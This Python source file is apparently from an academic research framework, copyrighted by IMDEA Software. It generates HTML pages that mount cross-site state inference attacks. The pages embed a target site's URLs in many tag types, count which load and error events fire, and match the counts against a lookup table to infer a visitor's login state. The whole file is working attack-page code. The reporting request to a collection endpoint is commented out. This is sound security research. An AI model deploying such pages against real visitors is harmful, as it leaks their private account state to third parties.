# -*- coding: utf-8 -*-

"""
	Copyright (C) 2019  Soheil Khodayari, IMDEA Software
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU Affero General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Affero General Public License for more details.
	You should have received a copy of the GNU Affero General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	Description:
	---------------
	Attack Page Generator Class for Events Fired (EF)

"""


# ----------------------------------------------------------------------- #
#                  EF Attack Page Generator Class
# ----------------------------------------------------------------------- #

import json

class EFAttackPageGenerator(object):
    """
        a pluggable HTML attack page generator class for COSI attacks
    """
    def __init__(self, uuid, **kwargs):
        self._uuid = uuid 
        for key in kwargs:
            setattr(self, key, kwargs[key])

    def __unicode__(self):
        return 'EF-APG ID-%s'%str(self._uuid)

    def __str__(self):
        return 'EF-APG ID-%s'%str(self._uuid)

    def __repr__(self):
        return 'EF-APG ID-%s'%str(self._uuid)

    # ----------------------------------------------------------------------- #
    #                   Common Public Methods
    # ----------------------------------------------------------------------- #

    def getID(self):
        return self._uuid

    # ----------------------------------------------------------------------- #
    #                   Common Private Methods
    # ----------------------------------------------------------------------- #

    def _convert_dict_to_string(self, d):
        return json.dumps(d)

    def _convert_string_to_dict(self, s):
        return json.loads(s)


    def _get_base_dom_document(self, document_title):
        document = '''
            <!DOCTYPE html>
            <html>
            <head>
                    <title>%s</title>
                    <meta charset="utf-8">
            </head>
            <body>
            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
            <script>
                window.onerror = function(){
                    // Catch DOM Error Thrown by Included Resources.
                    // This would mitigate the errors from preventing the javascript to get executed!
                    // console.log("JSError: Target Page Throwed Error on window object");
                    return true;
                }
            </script>
            </body>
            </html>
            '''%(document_title)

        return document

    # WARNING: Frame and FrameSet are not supported in HTML5
    def _get_base_dom_document_with_frameset(self, document_title):
        document = '''
            <!DOCTYPE html>
            <html>
            <head>
                    <title>%s</title>
                    <meta charset="utf-8">
                    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
            </head>
            <frameset id='frameset-container'>
            </frameset>
            </html>
            '''%(document_title)

        return document

    def _include_tag_in_head(self, html, tag_as_string):

        head_idx = html.find("</head>") #find: make sure an inner string </head> is not found instead
        html_low_part = html[:head_idx]
        html_high_part = html[head_idx:]

        return html_low_part + tag_as_string + html_high_part

    def _include_tag_in_body(self, html, tag_as_string):

        body_idx = html.rfind("</body>")  #rfind: make sure an inner string </body> is not found instead
        html_low_part = html[:body_idx]
        html_high_part = html[body_idx:]

        return html_low_part + tag_as_string + html_high_part


    # ----------------------------------------------------------------------- #
    #                           private EF
    # ----------------------------------------------------------------------- #

    def _get_ef_log_varname(self, event_name, tag_uuid):
        return "window.var%sCount%s"%(event_name, tag_uuid)

    def _get_ef_order_list_varname(self, tag_uuid):
        return "window.eventOrder%s"%tag_uuid

    def _get_tag_corresponding_attribute(self, tag_name):
        if tag_name == "img" or tag_name == "video" or tag_name == "audio" \
            or tag_name == "script" or tag_name == "track" or tag_name == "embed" \
            or tag_name == "iframe" or tag_name == "source" or tag_name == "input" \
            or tag_name == "frame":
            attribute = "src"
        elif tag_name == "applet":
            attribute = "code"
        elif tag_name == "link" or tag_name == "link_stylesheet" or tag_name == "link_prefetch" \
            or tag_name == "link_preload_style" or tag_name == "link_preload_script":
            attribute = "href"
        elif tag_name == "object":
            attribute = "data"
        elif tag_name == "videoPoster":
            attribute= "poster"
        return attribute

    def _attach_ef_define_order_list(self, html, tag_uuid):
        js = '''
        <script type="text/javascript">
            window.eventOrder%s = [];
        </script>
        '''%tag_uuid
        returnHTML = self._include_tag_in_body(html, js)
        return returnHTML

    def _attach_ef_define_order_list_frameset(self, html, tag_uuid):
        js = '''
        <script type="text/javascript">
            window.eventOrder%s = [];
        </script>
        '''%tag_uuid
        returnHTML = self._include_tag_in_head(html, js)
        return returnHTML

    # tag_uuid is a number appended to window.tag (hence e.g. window.tag123) so 
    # that multiple variables of window.tag are not overrriden
    def _attach_ef_log_collector(self, html, target_url, tag_name, tag_uuid, event_list):
        attribute = self._get_tag_corresponding_attribute(tag_name)
        if tag_name == "input":
            js = '''
            <script type="text/javascript">
                var tag = document.createElement("%s");
                tag.setAttribute("type", "image");
                tag.setAttribute("%s", "%s");
                window.tag%s = tag;
            '''%(tag_name, attribute, target_url, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = ''' 
                    document.body.appendChild(tag);
                    </script>
                    '''
            js = js + endJs
        elif tag_name == "videoPoster":
            js = '''
            <script type="text/javascript">
                var tag = document.createElement("video");
                tag.setAttribute("poster", "%s");
                window.tag%s = tag;
            '''%(target_url, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = ''' 
                    document.body.appendChild(tag);
                    </script>
                    '''
            js = js + endJs

        elif tag_name == "link_preload_script":
            js = '''
            <script type="text/javascript">
                var tag = document.createElement("link");
                tag.setAttribute("%s", "%s");
                tag.setAttribute("rel", "preload");
                tag.setAttribute("as", "script");

                window.tag%s = tag;
            '''%(attribute, target_url, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = '''     
                    document.body.appendChild(tag);
                    </script>
                    '''
            js = js + endJs
        elif tag_name == "link_preload_style":
            js = '''
            <script type="text/javascript">

                var tag = document.createElement("link");
                tag.setAttribute("%s", "%s");
                tag.setAttribute("rel", "preload");
                tag.setAttribute("as", "style");

                window.tag%s = tag;
            '''%(attribute, target_url, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = ''' 
                    
                    document.body.appendChild(tag);
                    </script>
                    '''
            js = js + endJs
        elif tag_name == "link_prefetch":
            js = '''
            <script type="text/javascript">
                var tag = document.createElement("link");
                tag.setAttribute("%s", "%s");
                tag.setAttribute("rel", "prefetch");

                window.tag%s = tag;
            '''%(attribute, target_url, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = ''' 
                    
                    document.body.appendChild(tag);
                    </script>
                    '''
            js = js + endJs
        elif tag_name == "link_stylesheet":
            js = '''
            <script type="text/javascript">
                var tag = document.createElement("link");
                tag.setAttribute("%s", "%s");
                tag.setAttribute("rel", "stylesheet");

                window.tag%s = tag;
            '''%(attribute, target_url, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = ''' 
                    
                    document.body.appendChild(tag);
                    </script>
                    '''
            js = js + endJs
        elif tag_name == "object":
            js = '''
            <script type="text/javascript">
                var tag = document.createElement("%s");
                tag.setAttribute("%s", "%s");
                window.tag%s= tag;
            '''%(tag_name, attribute, target_url, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = ''' 
                    
                    document.body.appendChild(tag);
                    </script>
                    '''
            js = js + endJs
        elif tag_name == "audio" or tag_name == "video":
            js = '''
            <script type="text/javascript">
                var tag = document.createElement("%s");
                tag.setAttribute("%s", "%s");
                window.tag%s= tag;
            '''%(tag_name, attribute, target_url, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = ''' 
                    
                    document.body.appendChild(tag);
                    </script>
                    '''
            js = js + endJs
        elif tag_name == "source":
            js = '''
            <script type="text/javascript">
                var videoTag = document.createElement("video");
                var tag = document.createElement("%s");
                tag.setAttribute("%s", "%s");
                videoTag.appendChild(tag);
                videoTag.autoplay = true;
                window.sourceTag%s = tag;
                window.videoTag%s = videoTag;
            '''%(tag_name, attribute, target_url, tag_uuid, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = ''' 
                    
                    document.body.appendChild(videoTag);
                    </script>
                    '''
            js = js + endJs
        elif tag_name == "track":
            js = '''
            <script type="text/javascript">
                var videoTag = document.createElement("video");
                videoTag.setAttribute("src", "https://interactive-examples.mdn.mozilla.net/media/examples/friday.mp4");
                var tag = document.createElement("%s");
                tag.setAttribute("%s", "%s");
                videoTag.appendChild(tag);
                videoTag.autoplay = true;
                window.trackTag%s = tag;
                window.videoTag%s = videoTag;
            '''%(tag_name, attribute, target_url, tag_uuid, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = ''' 
                    
                    document.body.appendChild(videoTag);
                    </script>
                    '''
            js = js + endJs
        else:
            js = '''
            <script type="text/javascript">
                var tag = document.createElement("%s");
                tag.setAttribute("%s", "%s");
                window.tag%s = tag;
            '''%(tag_name, attribute, target_url, tag_uuid)
            for event_name in event_list:
                varname= self._get_ef_log_varname(event_name, tag_uuid)
                order_list_varname = self._get_ef_order_list_varname(tag_uuid)
                appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                    }
                '''%(varname, event_name, varname, order_list_varname, event_name)
                js = js + appendJs

            endJs = ''' 
                    
                    document.body.appendChild(tag);
                    </script>
                    '''
            js = js + endJs
        returnHTML = self._include_tag_in_body(html, js)
        return returnHTML

    def _attach_ef_log_collector_frameset(self, html, target_url, tag_name, tag_uuid, event_list):
        assert tag_name == "frame";
        attribute = self._get_tag_corresponding_attribute(tag_name)
        js = '''
        <script type="text/javascript">
            $(document).ready(function(){
            var tag = document.createElement("frame");
            tag.setAttribute("%s", "%s");
            window.tag%s = tag;
        '''%(attribute, target_url, tag_uuid)
        for event_name in event_list:
            varname= self._get_ef_log_varname(event_name, tag_uuid)
            order_list_varname = self._get_ef_order_list_varname(tag_uuid)
            appendJs= '''

                %s = 0;
                tag.%s = function(){
                    %s +=1;
                    %s.push("%s");
                }
            '''%(varname, event_name, varname, order_list_varname, event_name)
            js = js + appendJs

        endJs = ''' 
                
                document.getElementById("frameset-container").appendChild(tag);
                });
                </script>
                '''
        js = js + endJs
        returnHTML = self._include_tag_in_head(html, js)
        return returnHTML

    def _attach_ef_log_sender(self, html, target_url, tag_name, tag_uuid, report_uri, ks_lookup_string):
        order_list_varname = self._get_ef_order_list_varname(tag_uuid)
        js = '''
            <script type="text/javascript">
            var postEventCountResults%s = function(){
                var uniqueEvents = Array.from(new Set(%s));
                var event_count = { };
                for(var i=0; i<uniqueEvents.length; i++){
                    event_count[uniqueEvents[i]]= eval("window.var"+uniqueEvents[i]+"Count%s");
                }
                if(!window.global_memory.hasOwnProperty("%s")){
                    window.global_memory["%s"] = { };
                }    
                window.global_memory["%s"]["%s"] = event_count;
                if(!window.global_memory.hasOwnProperty('ks')){
                    window.global_memory.ks = %s;
                }

                var logMessage = {
                    "target_url": "%s", 
                    "tag": "%s",
                    "tag_uuid": "%s", 
                    "event_order": JSON.stringify(%s),
                    "event_count": JSON.stringify(event_count),
                    "ks_lookup": JSON.stringify(%s),
                }

                    // request = $.ajax({
                    //         url: "%s",
                    //         contentType: "application/json; charset=utf-8",
                    //         type: "post",
                    //         data: JSON.stringify(logMessage),
                    //         dataType: 'text',
                    //         crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //         console.log("message sent to log server");
                    //         console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //         console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
            setTimeout(function() {
                    postEventCountResults%s();
                    }, 6000);
            </script>
        '''%(tag_uuid, order_list_varname, tag_uuid, target_url, target_url, target_url, tag_name, ks_lookup_string, target_url, tag_name, tag_uuid, order_list_varname, ks_lookup_string, report_uri, tag_uuid)

        if tag_name == "frame":
            returnHTML = self._include_tag_in_head(html, js)
        else:
            returnHTML = self._include_tag_in_body(html, js)
        return returnHTML

    def _attach_ef_global_memory(self, html):
        js = '''
        <script type="text/javascript">
            window.global_memory = { };
        </script>
        '''
        returnHTML = self._include_tag_in_body(html, js)
        return returnHTML

    def _attach_ef_global_memory_frameset(self, html):
        js = '''
        <script type="text/javascript">
            window.global_memory = { };
        </script>
        '''
        returnHTML = self._include_tag_in_head(html, js)
        return returnHTML

    # prints the infered state in the browser's console
    # only as a PROOF of concept
    def _attack_ef_console_state_printer(self, html):
        js = '''
        <script type="text/javascript">
            var printInferredState = function(){
                var ks = window.global_memory['ks'];
                var possible_states = [];
                for(var key in window.global_memory){
                    if(key == 'ks') continue;
                    var url = key;
                    if(!window.global_memory.ks.hasOwnProperty(url)) continue; // URL is for another attack class other than EF
                    for(var tagname in window.global_memory[url]){
                        var events = window.global_memory[url][tagname];
                        var ks_lookup_key = '';
                        var i = 0;
                        for(var event in events){
                            i = i + 1;
                            if(i > 1){
                                ks_lookup_key += ";"+event+ "-"+ events[event]
                            }else {
                                ks_lookup_key += ""+event+ "-"+ events[event]
                            }   
                        }
                        if(ks[url][tagname].hasOwnProperty(ks_lookup_key)){
                            // if ks knows anything about this incident
                            var inferred_state = ks[url][tagname][ks_lookup_key];
                            possible_states.push(inferred_state);
                        }
                    }
                }
                if(possible_states.length == 0) console.log("no states indentified!!!") 
                else if(possible_states.length == 1){
                    console.log("[EF] Possible State: "+ possible_states[0])
                }
                else {
                    if(possible_states.includes('Logout')){
                        // var others= possible_states.filter(item => item !== 'Logout')
                        console.log("[EF] Possible State: Logout")
                    }
                    else if (possible_states.includes('Logged')){
                        var others= possible_states.filter(item => item !== 'Logged')
                        // console.log(others);
                        var oth = [];
                        others.forEach(function(item){
                            if(item.includes('Logout')){
                                item = item.replace(/, Logout/g, '');
                            }
                            oth.push(item);
                        });
                        console.log("[EF] Possible State: "+ JSON.stringify(oth))
                    }
                }
                window.possible_states = possible_states;

            }
            setTimeout(function(){
                printInferredState();
            }, 7000);
        </script>
        '''
        returnHTML = self._include_tag_in_body(html, js)
        return returnHTML

    # prints the infered state in the browser's console
    # only as a PROOF of concept
    def _attack_ef_console_state_printer_frameset(self, html):
        js = '''
        <script type="text/javascript">
            var printInferredState = function(){
                var ks = window.global_memory['ks'];
                var possible_states = [];
                for(var key in window.global_memory){
                    if(key == 'ks') continue;
                    var tagname = key;
                    var events = window.global_memory[tagname];
                    var ks_lookup_key = '';
                    var i = 0;
                    for(var event in events){
                        i = i + 1;
                        if(i > 1){
                            ks_lookup_key += ";"+event+ "-"+ events[event]
                        }else {
                            ks_lookup_key += ""+event+ "-"+ events[event]
                        }   
                    }
                    if(ks[tagname].hasOwnProperty(ks_lookup_key)){
                        // if ks knows anything about this incident
                        var inferred_state = ks[tagname][ks_lookup_key];
                        possible_states.push(inferred_state);
                    }
                }
                if(possible_states.length == 0) return 0; 
                else if(possible_states.length == 1){
                    console.log("Inferred State: "+ possible_states[0])
                }
                else {
                    if(!possible_states.includes('Logged-Out')){
                        var others= possible_states.filter(item => item !== 'Logged-Out')
                        console.log("Possible States: "+ JSON.stringify(others))
                    }
                }

            }
            setTimeout(function(){
                printInferredState();
            }, 10000);
        </script>
        '''
        returnHTML = self._include_tag_in_head(html, js)
        return returnHTML
    # ----------------------------------------------------------------------- #
    #                       Interface
    # ----------------------------------------------------------------------- #

    # Inputs 
    #   @inclusion_url: 
    #       - the target inclusion url to exploit for the attack
    #   @tag_event_dictionary: 
    #       - a key-value dictionary, each key being a tag
    #       name, each value is a list of DOM events to test for the related tag
    #       e.g. {'script': ['onload', 'onerror'], 'object': ['onload', 'onerror'],}
    #   @report_uri:
    #       the log endpoint string to report the side-channel leak collected data 
    # Outputs 
    #   a string containing the HTML of the EF attack page 
    #
    # Special Supported-Tags
    #   use 'videoPoster' for video tag with poster attribute used for inclusion
    #   use 'link_stylesheet', 'link_prefetch', 'link_preload_style', 'link_preload_script' for the link tag 
    #   WARNING: for a link tag not included in one of the four cases above, the browser   
    #   will NOT (most probably) send an HTTP request!
    def get_ef_attack_page(self, inclusion_url, tag_event_dictionary, ks_lookup, report_uri):

        document_title = "EF_Page"
        html = self._get_base_dom_document(document_title)
        html = self._attach_ef_global_memory(html)     
        html = self._attack_ef_console_state_printer(html) 
        idx = 0
        ks_lookup_string = self._convert_dict_to_string(ks_lookup)
        for tag in tag_event_dictionary:
            idx = idx + 1
            tag_uuid = idx
            event_list = tag_event_dictionary[tag]
            html = self._attach_ef_define_order_list(html, tag_uuid)
            html = self._attach_ef_log_collector(html, inclusion_url, tag, tag_uuid, event_list)
            html = self._attach_ef_log_sender(html, inclusion_url, tag, tag_uuid, report_uri, ks_lookup_string)

        return html


    # Inputs 
    #   @inclusion_url: 
    #       - the target inclusion url to exploit for the attack
    #   @tag_event_dictionary: 
    #       - a key-value dictionary, each key being a tag
    #       name, each value is a dictionary itself, having two keys: 'events' and 'inclusion_url' 
    #       the value for 'events' is a list of DOM events to test for the related tag
    #       the value for 'inclusion_url' is a string
    #       e.g. {'script': {'events': ['onload', 'onerror'], 'inclusion_url':''}, ....}
    #   @ks_lookup 
    #       a python dictionary of the knowledge source comparsion table
    #   @report_uri:
    #       the log endpoint string to report the side-channel leak collected data 
    # Outputs 
    #   a string containing the HTML of the EF attack page, with EF multiple inclusions 
    #
    # Special Supported-Tags
    #   use 'videoPoster' for video tag with poster attribute used for inclusion
    #   use 'link_stylesheet', 'link_prefetch', 'link_preload_style', 'link_preload_script' for the link tag 
    #   WARNING: for a link tag not included in one of the four cases above, the browser   
    #   will NOT (most probably) send an HTTP request!

    def get_ef_attack_page_multiple_inclusion(self, ks_include, ks_lookup, report_uri):
        document_title = "EF_Mult_Page"
        idx = 0
        ks_lookup_string = self._convert_dict_to_string(ks_lookup)
        html = self._get_base_dom_document(document_title)   
        html = self._attach_ef_global_memory(html) 
        html = self._attack_ef_console_state_printer(html)         
        for inclusion_url in ks_include:
            tag_event_and_target_dict = ks_include[inclusion_url]
            for tag in tag_event_and_target_dict:
                idx = idx + 1
                tag_uuid = idx
                event_list = tag_event_and_target_dict[tag]
                html = self._attach_ef_define_order_list(html, tag_uuid)
                html = self._attach_ef_log_collector(html, inclusion_url, tag, tag_uuid, event_list)
                html = self._attach_ef_log_sender(html, inclusion_url, tag, tag_uuid, report_uri, ks_lookup_string)

        return html


    # Inputs 
    #   @inclusion_url: 
    #       - the target inclusion url to exploit for the attack
    #   @tag_event_dictionary: 
    #       - a key-value dictionary, each key being a tag
    #       name, each value is a list of DOM events to test for the related tag
    #       e.g. {'frame': ['onload', 'onerror']} 
    #   @report_uri:
    #       the log endpoint string to report the side-channel leak collected data 
    # Outputs 
    #   a string containing the HTML of the EF attack page 
    #
    def get_ef_attack_page_frameset(self, inclusion_url, tag_event_dictionary, ks_lookup, report_uri):

        document_title = "EF_Page"
        html = self._get_base_dom_document_with_frameset(document_title)
        html = self._attach_ef_global_memory_frameset(html)
        html = self._attack_ef_console_state_printer_frameset(html) 
        idx = 0
        ks_lookup_string = self._convert_dict_to_string(ks_lookup)
        for tag in tag_event_dictionary:
            idx = idx + 1
            tag_uuid = idx
            event_list = tag_event_dictionary[tag]
            html = self._attach_ef_define_order_list_frameset(html, tag_uuid)
            html = self._attach_ef_log_collector_frameset(html, inclusion_url, tag, tag_uuid, event_list)
            html = self._attach_ef_log_sender(html, inclusion_url, tag, tag_uuid, report_uri, ks_lookup_string)


        return html


    # Inputs 
    #   @inclusion_url: 
    #       - the target inclusion url to exploit for the attack
    #   @tag_event_dictionary: 
    #       - a key-value dictionary, each key being a tag
    #       name, each value is a dictionary itself, having two keys: 'events' and 'inclusion_url' 
    #       the value for 'events' is a list of DOM events to test for the related tag
    #       the value for 'inclusion_url' is a string
    #       e.g. {'frame': {'events': ['onload', 'onerror'], 'inclusion_url':''}, ....}
    #   @report_uri:
    #       the log endpoint string to report the side-channel leak collected data 
    # Outputs 
    #   a string containing the HTML of the EF attack page, with EF multiple inclusions 
    #

    def get_ef_attack_page_multiple_inclusion_frameset(self, tag_event_and_target_dict, ks_lookup, report_uri):
        document_title = "EF_Mult_Page"
        idx = 0
        html = self._get_base_dom_document_with_frameset(document_title)
        html = self._attach_ef_global_memory_frameset(html)
        html = self._attack_ef_console_state_printer_frameset(html) 
        ks_lookup_string = self._convert_dict_to_string(ks_lookup)
        for tag in tag_event_and_target_dict:
            idx = idx + 1
            tag_uuid = idx
            event_list = tag_event_and_target_dict[tag]['events']
            inclusion_url = tag_event_and_target_dict[tag]['inclusion_url']
                      
            html = self._attach_ef_define_order_list_frameset(html, tag_uuid)
            html = self._attach_ef_log_collector_frameset(html, inclusion_url, tag, tag_uuid, event_list)
            html = self._attach_ef_log_sender(html, inclusion_url, tag, tag_uuid, report_uri, ks_lookup_string)


        return html

